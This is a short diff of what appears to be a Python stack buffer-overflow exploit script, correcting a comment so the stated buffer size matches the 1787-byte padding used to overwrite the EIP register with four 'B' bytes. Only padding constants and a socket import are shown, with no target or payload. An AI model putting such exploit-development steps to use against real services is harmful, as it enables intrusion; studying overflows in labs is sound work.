@@ -5,7 +5,7 @@
 # This script is intended the specific stack crash 1787 bytes (A) and 4 more bytes (B) characters to overwrite the EIP
 import socket
 
-# buffer 1797
+# buffer 1787
 FUZZ = "A" * 1787
 EIP = "B" * 4
 
